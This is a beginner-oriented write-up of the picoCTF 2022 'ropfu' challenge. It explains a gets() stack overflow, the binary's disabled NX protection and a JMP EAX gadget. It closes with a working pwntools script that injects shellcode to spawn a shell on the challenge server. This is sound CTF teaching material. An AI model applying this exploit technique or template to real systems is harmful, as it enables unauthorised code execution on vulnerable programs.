## Introduction

Hi everyone! In this article I will talk about the binary exploitation challenge 'ropfu' of picoCTF 2022.

I promise I will do my best to keep this guide as beginner-friendly as possible, but a *bit* of general knowledge about binary exploitation is required to understand the following guide.

If you're more expert, feel free to skip this first part using the table of contents on the right!

## Code Analysis and Debugging

The thing that made me like this challenge a lot is its simplicity. 
All the binary does is:
1. print a welcome text
2. wait for user input
3. end without printing anything 

By taking a look at the .c file the challenge provided us, we can clearly see that nothing else is done.
```
void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);
}
```
First an array of 16 characters (so 16 bytes) is created, and then it's filled with user input using the function [gets](https://www.tutorialspoint.com/c_standard_library/c_function_gets.htm). The problem with this function is that it stops only when the user input ends (or when it encounters a newline character).

So if we type in our input more than 16 characters, we're overwriting areas of our memory we shouldn't have access to. This means we have a **buffer overflow** vulnerability.

Let's investigate a bit more in depth using a debugger. Specifically, I'm gonna be using gdb enhanced with [gef](https://gef.readthedocs.io/en/master/)

1. Let's place a breakpoint after the program fills the buffer with our input: `b* 0x8049dcc`

**TIP:** You can use a decompiler like Ghidra to find the address of the instruction you want to place the breakpoint on
{: .notice--info}
2. Run the binary using the command `r` and type something like 'aaaaaaaaaaaaaaaa' to fill the buffer but without doing an overflow
3. Run the command `telescope` to see the contents of the stack in a pretty format

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/writeups/ropfu/stack1.png)

In order, we have:
- our buffer of 16 bytes
- other 2 unknown variables of 4 bytes (not important, since we know they're not used by the program)
- the ebp register (if you don't know what that is, watch [this video](https://youtu.be/jyRQpRHSYNY))
- the return address, which points to the instruction that will be executed when our 'vuln' function ends. This is very important for us attackers, since we can overwrite this to control what the program executes!

Now that we have a general idea of what's inside the stack, we have one last thing to do: check the security measures of the binary. We can do that inside gef by running the command `checksec`:

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/writeups/ropfu/checksec.png)

Gef identified a stack canary, i.e. a random 4-byte value placed before the ebp register that terminates the program if it's overwritten with a different value.
In theory this should prevent us from overwriting the return address; however, the canary gef found (0x4928c500) is not present in the stack image above. In other words, the devs intentionally disabled this form of memory protection for the 'vuln' function, so we don't have to worry about that.

Another very important security measure that must not be overlooked is NX. Here it's disabled, meaning we can execute arbitrary code directly from the stack. As we'll see, this makes things a lot easier for us.

## The Plan

So, to recap:
- we have a buffer overflow vulnerability in the 'vuln' function that lets us overwrite its return address
- NX is disabled, so we can execute code directly from the stack

The plan is, of course, to spawn a shell. And to do that, we need to make the program execute a *shellcode*. If you're using [pwntools](https://docs.pwntools.com/en/stable/), you don't have to craft that by yourself but you can use `asm(shellcraft.sh())`, that returns a byte string of 44 bytes.

There's a problem though: we only control 28 bytes before the return address, so if we place our shellcode at the start of the buffer, we're gonna end up overwriting the return address with something invalid and get a segmentation fault.

The solution to this problem is actually pretty simple: we can just place the shellcode *after* the return address, like this:

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/writeups/ropfu/plan.png)

Nice, the only thing we miss now is to find a method to jump to the address where our shellcode is placed, and that's the hardest part of the challenge.

## Failed Attempts

In this section I want to share a bit of *"pain"* I went through when trying to solve this challenge. Feel free to skip this part if you want to know the solution right away.

- **Attempt #1: Leak the address of my shellcode**

The first strategy I had in mind was to call the `printf` function (through the 'vuln' function) but with a different parameter, so that I can print in output something important like the esp register (that always points to the top of the stack). And from there, overwrite the return address a second time with the address of my shellcode.
The main problem with that is the ebp register: before the 'vuln' function ends, the content of the 4 bytes before the return address is copied in the ebp register. If we want to overwrite the return address, we also need to overwrite those 4 bytes with garbage, since we don't have any information about stack adresses. This will cause segmentation fault if we call 'vuln' again starting from the printf call without modifying the register first. There has to be an easier way.

## Exploitation

Since leaking an address is not an option (or a too difficult one), it's pretty clear we have to work with what we already have: registers and gadgets, i.e. small snippets of code in the binary.
Let's place a breakpoint in the RET instruction of the 'vuln' function and analyze the registers:

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/writeups/ropfu/registers.png)

As expected, esp points to the return address... however, after the RET instruction is executed, it will point to what's right *after* that, our shellcode! In other words, if we can find a `JMP ESP` instruction in the binary, the challenge is over! Let's use **ropper** to search for that gadget:

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/writeups/ropfu/ropper1.png)

Unfortunately there are no `JMP ESP` instructions in the binary. But we are getting closer! Let's check again the registers to see if there's something else that can be useful to us...

You guessed it, the eax register! Since it points to the start of our buffer, if we manage to find a `JMP EAX` instruction, we can execute any code we want! Fingers crossed...

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/writeups/ropfu/ropper2.png)

Perfect! All we have to do now is to place a `JMP ESP` instruction at the start of the buffer, in **byte code** of course, so we'll use `asm('JMP ESP')`.
Here is the exploit:

This is an unpublished template for binary exploitation I created. Feel free to use it! :D
{: .notice--info}
```
#!/usr/bin/env python3

import sys
from pwn import *

if len(sys.argv) == 2 and sys.argv[1] in ['-l','-r']:
    if sys.argv[1] == '-l':
        execute_locally = True
    else:
        execute_locally = False
else:
    print("Usage: " + sys.argv[0] + " [-l/-r]\n\t-l: execute this exploit with gdb on the local elf (if you have one)\n\t-r: execute this exploit on the remote server")
    sys.exit()

# ------ REMOTE INFO ------
host, port = 'saturn.picoctf.net', PORT

# ------ LOCAL INFO (only if in whitebox environment) ------
context.binary = binary = './vuln'
vuln_elf = ELF(binary)
#libc = ELF('./path_to_libc')  # only if the challenge provides a libc library
#vuln_rop = ROP(vuln_elf) # only if you need to use gadgets

if execute_locally:
    io = process(binary)
    gdb.attach(io) # comment this line if you don't want to use gdb
else:
    io = remote(host, port)

# ---------------------------------------
# WRITE HERE YOUR EXPLOIT

payload = asm('jmp esp')
payload += b'a'* 26
payload += p32(0x0805334b)
payload += asm(shellcraft.sh())

print(io.recvrepeat(1))
io.sendline(payload)
print(io.recvrepeat(1))
io.interactive()
```

## Conclusion

This was a perfect introductory challenge to Returned Oriented Progamming (ROP).

Hope you learned something new from this writeup, see you in the next one!
